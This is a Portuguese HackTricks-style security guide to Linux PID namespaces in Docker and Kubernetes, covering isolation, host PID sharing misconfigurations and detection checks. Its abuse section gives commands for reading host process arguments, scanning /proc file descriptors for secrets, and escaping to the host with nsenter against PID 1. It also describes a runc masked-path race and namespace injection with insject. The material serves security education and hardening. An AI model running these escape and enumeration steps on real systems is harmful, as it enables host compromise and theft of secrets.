# Namespace de PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão geral

O namespace de PID controla como os processos são numerados e quais processos são visíveis. É por isso que um container pode ter seu próprio PID 1 mesmo não sendo uma máquina real. Dentro do namespace, a workload vê o que parece ser uma árvore de processos local. Fora do namespace, o host ainda vê os PIDs reais do host e todo o panorama de processos.

Do ponto de vista de segurança, o namespace de PID importa porque a visibilidade de processos é valiosa. Uma vez que uma workload pode ver processos do host, ela pode ser capaz de observar nomes de serviços, argumentos de linha de comando, segredos passados em argumentos de processos, estado derivado do ambiente através de `/proc`, e possíveis alvos para entrada em namespaces. Se puder fazer mais do que apenas ver esses processos, por exemplo enviando sinais ou usando ptrace nas condições adequadas, o problema se torna muito mais sério.

## Operação

Um novo namespace de PID começa com sua própria numeração interna de processos. O primeiro processo criado dentro dele torna-se PID 1 do ponto de vista do namespace, o que também significa que ele recebe semânticas especiais semelhantes a um init para filhos órfãos e comportamento de sinais. Isso explica muitas peculiaridades de containers relacionadas a processos init, coleta de zombies (zombie reaping), e por que pequenos wrappers init são às vezes usados em containers.

A lição de segurança importante é que um processo pode parecer isolado porque vê apenas sua própria árvore de PIDs, mas esse isolamento pode ser deliberadamente removido. Docker expõe isso através de `--pid=host`, enquanto Kubernetes faz isso através de `hostPID: true`. Uma vez que o container ingressa no namespace de PID do host, a workload vê os processos do host diretamente, e muitos caminhos de ataque posteriores se tornam muito mais realistas.

## Laboratório

Para criar um namespace de PID manualmente:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
O shell agora vê uma visão de processos privada. A flag `--mount-proc` é importante porque monta uma instância de procfs que corresponde ao novo PID namespace, tornando a lista de processos coerente do interior.

Para comparar o comportamento do container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
A diferença é imediata e fácil de entender, por isso este é um bom primeiro laboratório para os leitores.

## Uso em tempo de execução

Contêineres normais em Docker, Podman, containerd e CRI-O obtêm seu próprio namespace de PID. Kubernetes Pods geralmente também recebem uma visão de PID isolada, a menos que a carga de trabalho solicite explicitamente compartilhamento do PID do host. Ambientes LXC/Incus dependem do mesmo primitivo do kernel, embora casos de uso de system-container possam expor árvores de processos mais complicadas e incentivar atalhos de debugging.

A mesma regra se aplica em todos os lugares: se o runtime escolheu não isolar o namespace de PID, isso é uma redução deliberada na fronteira do contêiner.

## Misconfigurações

A misconfiguração canônica é o compartilhamento do PID do host. Equipes frequentemente a justificam para debugging, monitoring, ou conveniência de gerenciamento de serviços, mas isso deve sempre ser tratado como uma exceção de segurança significativa. Mesmo que o contêiner não tenha um write primitive imediato sobre processos do host, a visibilidade por si só pode revelar muito sobre o sistema. Uma vez que capacidades como `CAP_SYS_PTRACE` ou acesso útil ao procfs sejam adicionados, o risco aumenta significativamente.

Outro erro é assumir que, por a carga de trabalho não poder matar ou ptrace processos do host por padrão, o compartilhamento do PID do host é, portanto, inofensivo. Essa conclusão ignora o valor da enumeração, a disponibilidade de targets de entrada em namespace, e a forma como a visibilidade de PID se combina com outros controles enfraquecidos.

## Abuso

Se o namespace de PID do host for compartilhado, um atacante pode inspecionar processos do host, extrair argumentos de processos, identificar serviços interessantes, localizar PIDs candidatos para `nsenter`, ou combinar a visibilidade de processos com privilégios relacionados a ptrace para interferir no host ou em cargas de trabalho vizinhas. Em alguns casos, simplesmente ver o processo de longa execução correto é suficiente para remodelar o restante do plano de ataque.

O primeiro passo prático é sempre confirmar que os processos do host estão realmente visíveis:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Uma vez que os PIDs do host estejam visíveis, os argumentos dos processos e os alvos de entrada de namespace frequentemente se tornam a fonte de informação mais útil:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Se `nsenter` estiver disponível e houver privilégios suficientes, teste se um processo visível do host pode ser usado como ponte de namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Mesmo quando a entrada é bloqueada, o compartilhamento de PID do host já é valioso porque revela a disposição dos serviços, componentes em tempo de execução e processos privilegiados candidatos a serem alvo em seguida.

A visibilidade de PID do host também torna o file-descriptor abuse mais realista. Se um processo privilegiado do host ou workload vizinho tiver um arquivo sensível ou socket aberto, o atacante pode ser capaz de inspecionar `/proc/<pid>/fd/` e reutilizar esse handle dependendo da propriedade, das opções de montagem do procfs e do modelo de serviço alvo.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Esses comandos são úteis porque respondem se `hidepid=1` ou `hidepid=2` estão reduzindo a visibilidade entre processos e se descritores obviamente interessantes, como arquivos secretos abertos, logs ou sockets Unix, estão visíveis.

### Exemplo completo: PID do host + `nsenter`

O compartilhamento do PID do host se torna uma fuga direta para o host quando o processo também tem privilégios suficientes para ingressar nos namespaces do host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Se o comando for bem-sucedido, o processo do container agora está executando nos namespaces mount, UTS, network, IPC e PID do host. O impacto é o comprometimento imediato do host.

Mesmo quando `nsenter` não está presente, o mesmo resultado pode ser alcançado através do binário do host se o sistema de arquivos do host estiver montado:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notas recentes de tempo de execução

Alguns ataques relevantes ao PID-namespace não são as tradicionais falhas de configuração `hostPID: true`, mas bugs de implementação em tempo de execução relacionados a como as proteções do procfs são aplicadas durante a configuração do container.

#### Corrida de `maskedPaths` para o procfs do host

Em versões vulneráveis do `runc`, atacantes capazes de controlar a imagem do container ou a carga de trabalho `runc exec` podiam competir na fase de mascaramento substituindo o `/dev/null` do lado do container por um link simbólico para um caminho sensível do procfs, como `/proc/sys/kernel/core_pattern`. Se a corrida tivesse sucesso, o bind mount do masked-path poderia acabar no alvo errado e expor parâmetros globais do procfs do host ao novo container.

Comando útil para revisão:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Isto é importante porque o impacto eventual pode ser o mesmo que uma exposição direta do procfs: `core_pattern` ou `sysrq-trigger` graváveis, resultando em host code execution ou denial of service.

#### Injeção de namespace com `insject`

Ferramentas de injeção de namespace, como `insject`, mostram que a interação com PID-namespace nem sempre requer entrar no namespace alvo antes da criação do processo. Um helper pode anexar-se depois, usar `setns()`, e executar preservando a visibilidade no espaço PID alvo:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Esse tipo de técnica é relevante principalmente para depuração avançada, ferramentas ofensivas e fluxos de trabalho de post-exploitation, onde é necessário entrar no contexto de namespace depois que o runtime já inicializou a carga de trabalho.

### Padrões relacionados de abuso de FD

Dois padrões valem ser destacados explicitamente quando os PIDs do host estão visíveis. Primeiro, um processo privilegiado pode manter um descritor de arquivo sensível aberto durante um `execve()` porque não foi marcado com `O_CLOEXEC`. Segundo, serviços podem passar descritores de arquivo por sockets Unix via `SCM_RIGHTS`. Em ambos os casos, o objeto interessante não é mais o pathname, mas o descritor já aberto que um processo de menor privilégio pode herdar ou receber.

Isso importa no trabalho com containers porque o descritor pode apontar para `docker.sock`, um log privilegiado, um arquivo secreto do host ou outro objeto de alto valor mesmo quando o próprio caminho não é diretamente acessível a partir do sistema de arquivos do container.

## Checks

O objetivo desses comandos é determinar se o processo tem uma visão de PID privada ou se ele já pode enumerar um panorama de processos muito mais amplo.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
O que é interessante aqui:

- Se a lista de processos contiver serviços do host óbvios, host PID sharing provavelmente já está em vigor.
- Ver apenas uma pequena árvore local do container é o padrão; ver `systemd`, `dockerd`, ou daemons não relacionados não é.
- Uma vez que host PIDs estejam visíveis, mesmo informações de processo somente leitura tornam-se úteis para reconnaissance.

Se você descobrir um container rodando com host PID sharing, não o trate como uma diferença cosmética. É uma mudança importante no que a carga de trabalho pode observar e potencialmente afetar.
